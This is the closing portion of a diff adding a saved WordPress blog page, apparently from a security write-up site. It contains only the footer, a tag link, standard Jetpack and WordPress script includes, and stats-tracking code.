+<a href="../../tag/xss/index.html" class="tag-cloud-link tag-link-39 tag-link-position-17" style="font-size: 8pt;" aria-label="xss (1 item)">xss</a></div>
+</aside>			</div><!-- .widget-area -->
+		</div><!-- .sidebar-inner -->
+	</div><!-- #tertiary -->
+
+		</div><!-- #main -->
+		<footer id="colophon" class="site-footer" role="contentinfo">
+			
+			<div class="site-info">
+								<a href="https://wordpress.org/">Proudly powered by WordPress</a>
+			</div><!-- .site-info -->
+		</footer><!-- #colophon -->
+	</div><!-- #page -->
+
+		<div style="display:none">
+	</div>
+<script type='text/javascript' src='../../wp-content/plugins/jetpack/_inc/build/photon/photon.min.js%3Fver=20190201'></script>
+<script type='text/javascript' src='https://s0.wp.com/wp-content/js/devicepx-jetpack.js?ver=202333'></script>
+<script type='text/javascript' src='../../wp-content/themes/twentythirteen/js/functions.js%3Fver=20160717'></script>
+<script type='text/javascript' src='../../wp-includes/js/wp-embed.min.js%3Fver=5.2.2'></script>
+<script type='text/javascript' src='../../wp-content/plugins/jetpack/_inc/build/spin.min.js%3Fver=1.3'></script>
+<script type='text/javascript' src='../../wp-content/plugins/jetpack/_inc/build/jquery.spin.min.js%3Fver=1.3'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var jetpackCarouselStrings = {"widths":[370,700,1000,1200,1400,2000],"is_logged_in":"","lang":"en","ajaxurl":"https:\/\/babyphd.net\/wp-admin\/admin-ajax.php","nonce":"5cd6f523b0","display_exif":"1","display_geo":"1","single_image_gallery":"1","single_image_gallery_media_file":"","background_color":"black","comment":"Comment","post_comment":"Post Comment","write_comment":"Write a Comment...","loading_comments":"Loading Comments...","download_original":"View full size <span class=\"photo-size\">{0}<span class=\"photo-size-times\">\u00d7<\/span>{1}<\/span>","no_comment_text":"Please be sure to submit some text with your comment.","no_comment_email":"Please provide an email address to comment.","no_comment_author":"Please provide your name to comment.","comment_post_error":"Sorry, but there was an error posting your comment. Please try again later.","comment_approved":"Your comment was approved.","comment_unapproved":"Your comment is in moderation.","camera":"Camera","aperture":"Aperture","shutter_speed":"Shutter Speed","focal_length":"Focal Length","copyright":"Copyright","comment_registration":"0","require_name_email":"1","login_url":"https:\/\/babyphd.net\/wp-login.php?redirect_to=https%3A%2F%2Fbabyphd.net%2F2015%2F01%2F13%2Fhackim-2014-re-pwn-mentalnote%2F","blog_id":"1","meta_data":["camera","aperture","shutter_speed","focal_length","copyright"],"local_comments_commenting_as":"<fieldset><label for=\"email\">Email (Required)<\/label> <input type=\"text\" name=\"email\" class=\"jp-carousel-comment-form-field jp-carousel-comment-form-text-field\" id=\"jp-carousel-comment-form-email-field\" \/><\/fieldset><fieldset><label for=\"author\">Name (Required)<\/label> <input type=\"text\" name=\"author\" class=\"jp-carousel-comment-form-field jp-carousel-comment-form-text-field\" id=\"jp-carousel-comment-form-author-field\" \/><\/fieldset><fieldset><label for=\"url\">Website<\/label> <input type=\"text\" name=\"url\" class=\"jp-carousel-comment-form-field jp-carousel-comment-form-text-field\" id=\"jp-carousel-comment-form-url-field\" \/><\/fieldset>"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='../../wp-content/plugins/jetpack/_inc/build/carousel/jetpack-carousel.min.js%3Fver=20190102'></script>
+<script type='text/javascript' src='https://stats.wp.com/e-202333.js' async='async' defer='defer'></script>
+<script type='text/javascript'>
+	_stq = window._stq || [];
+	_stq.push([ 'view', {v:'ext',j:'1:7.5.2',blog:'104079289',post:'0',tz:'0',srv:'babyphd.net'} ]);
+	_stq.push([ 'clickTrackerInit', '104079289', '0' ]);
+</script>
+</body>
+</html>
